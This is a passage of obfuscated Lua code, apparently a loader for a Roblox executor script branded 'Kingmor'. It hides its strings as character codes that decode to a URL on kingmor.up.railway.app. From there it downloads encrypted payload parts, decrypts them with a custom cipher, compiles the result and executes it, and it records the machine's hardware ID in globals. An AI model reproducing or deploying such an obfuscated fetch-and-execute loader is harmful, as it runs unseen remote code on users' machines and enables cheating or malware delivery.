  for i=1,#s do h=(h*33+string.byte(s,i))%4294967296 end
  return h
end
local function _ff70a3(S)
  local sa,pa=2662589019,70
  local sb,pb=4169880560,122
  local MA,AA,LA=916763,-898500171,1829388
  local MB,AB,LB=592865,-198850441,11834584
  local KA={175,180,34,142,112,23,111,75,66,74,235,197,72,56,32,3,49,17,124,114,210,253,9,166,249,199,53,79,12,206,5,77}
  local KB={91,58,140,76,22,183,173,10,80,228,248,151,194,123,68,28,55,46,136,9,108,52,7,214,157,77,238,183,30,37,189,157}
  local out,n={},0
  for i=1,#S do
    local c=string.byte(S,i)
    sb=(MB*sb+AB)%4294967296
    local ksb=(sb%256+KB[((i-1)%32)+1]+((i*113+LB)%256)+pb)%256
    pb=c
    local mid=(_a8b7f8[c]-ksb)%256
    sa=(MA*sa+AA)%4294967296
    local ksa=(sa%256+KA[((i-1)%32)+1]+((i*113+LA)%256)+pa)%256
    pa=mid
    local p=(_9b3d3f[mid]-ksa)%256
    n=n+1
    out[n]=_baa0f0[p]
  end
  return table.concat(out)
end
local _f28fe1
do
  local np = _0175bc
  local base = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,51,51,53,48,48,55,51,99,48,97,97,50,100,57,46,108,117,97,63,112,97,99)..string.char(107,61,49,38,112,97,114,116,61)) .. "@@PARTNUM@@" .. string.char(38,100,116,111,107,61) .. _6238c5
  local single = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,51,51,53,48,48,55,51,99,48,97,97,50,100,57,46,108,117,97,63,115,105,110)..string.char(103,108,101,61,49,38,100,116,111,107,61)) .. _6238c5
  local function take(res, err)
    if type(res) ~= "string" or #res < 9 then return nil, tostring(err or res or "empty") end
    local hx = string.sub(res, 1, 8)
    local okNum = true
    pcall(function() if tonumber(hx, 16) == nil then okNum = false end end)
    if not okNum then return nil, "message" end
    local want = _06fdfb(hx)
    local body = string.sub(res, 9)
    if (_e4d5d9(body) % 4294967296) ~= want then return nil, "checksum" end
    return body, nil
  end
  local function fetchAll()
    if _56fa8d == nil then return nil, string.char(110,111,32,108,111,97,100,101,114) end
    local res, err = _122891(single)
    local body, why = take(res, err)
    if body == nil then return nil, why end
    if body ~= "" and (_e4d5d9(body) % 4294967296) ~= _06fdfb(_ce594e) then
      return nil, string.char(112,97,121,108,111,97,100,32,104,97,115,104)
    end
    return { body }
  end
  local got = {}
  local missing = nil
  for i = 1, np do
    local body, lastErr = nil, nil
    for attempt = 1, 6 do
      local res, err = _122891(string.gsub(base, "@@PARTNUM@@", tostring(i)))
      if type(res) == "string" and #res == 0 then
        body = ""
        break
      end
      body, lastErr = take(res, err)
      if body ~= nil then break end
      if lastErr == "message" then _cbb12a(string.char(68,101,108,105,118,101,114,121,32,114,101,106,101,99,116,101,100)) return end
      nap(0.25 * attempt)
    end
    if body == nil then
      missing = tostring(i)
      break
    end
    got[i] = body
  end
  if missing == nil then
    _f28fe1 = got
  else
    local all, why = fetchAll()
    if all == nil then
      _cbb12a(string.char(68,111,119,110,108,111,97,100,32,102,97,105,108,101,100,32,112,97,114,116,32) .. missing)
      return
    end
    _f28fe1 = all
  end
end
local ok, plain, why = (function()
  local sh = _f28fe1
  if type(sh) ~= "table" then return false, nil, string.char(110,111,32,112,97,121,108,111,97,100) end
  local parts = {}
  for i = 1, #sh do parts[#parts+1] = sh[i] end
  local joined = table.concat(parts)
  parts = nil
  sh = nil
  _f28fe1 = nil
  if #joined == 0 then return false, nil, string.char(101,109,112,116,121,32,112,97,121,108,111,97,100) end
  local expect = _06fdfb(_ce594e)
  if expect ~= nil and (_e4d5d9(joined) % 4294967296) ~= expect then
    return false, nil, string.char(112,97,121,108,111,97,100,32,99,104,101,99,107,115,117,109,32,109,105,115,109,97,116,99,104)
  end
  local raw = _972da6(joined)
  joined = nil
  local out = (_ff70a3)(raw)
  raw = nil
  if type(out) ~= "string" or #out == 0 then return false, nil, string.char(100,101,99,114,121,112,116,32,102,97,105,108,101,100) end
  local ph = _06fdfb(_acedfa)
  if ph ~= nil and (_e4d5d9(out) % 4294967296) ~= ph then
    return false, nil, string.char(105,110,116,101,103,114,105,116,121,32,109,105,115,109,97,116,99,104)
  end
  return true, out, nil
end)()
if not ok then
  _cbb12a(string.char(80,97,121,108,111,97,100,32,101,114,114,111,114,58,32) .. tostring(why))
  return
end
do
  local sess = {ok = true, sid = string.char(51,51,53,48,48,55,51,99,48,97,97,50,100,57), scriptId = string.char(51,51,53,48,48,55,51,99,48,97,97,50,100,57), t = 0}
  pcall(function() if type(os) == "table" and type(os.clock) == "function" then sess.t = os.clock() end end)
  local function setg(name, value)
    pcall(function() if type(getgenv) == "function" then local g = getgenv() if type(g) == "table" then g[name] = value end end end)
    pcall(function() if type(_G) == "table" then _G[name] = value end end)
  end
  setg(string.char(95,75,77,95,65,85,84,72), sess)
  setg(string.char(95,75,77,95,83,73,68), sess.sid)
  setg(string.char(95,75,77,95,66,65,83,69), string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112))
  setg(string.char(95,75,77,95,72,87,73,68), hwid)
end
local fn, cerr = _3ce362[1](_56fa8d, plain)
plain = nil
if type(fn) ~= "function" then
  warn(string.char(91,75,105,110,103,109,111,114,93,32,99,111,109,112,105,108,101,58,32) .. tostring(cerr))
  _cbb12a(string.char(83,99,114,105,112,116,32,99,111,109,112,105,108,101,32,101,114,114,111,114))
  return
end
local rok, runErr = _3ce362[2](fn, false)
fn = nil
pcall(function() if collectgarbage then collectgarbage("collect") end end)
if not rok then warn(string.char(91,75,105,110,103,109,111,114,93,32,114,117,110,116,105,109,101,58,32) .. tostring(runErr)) end
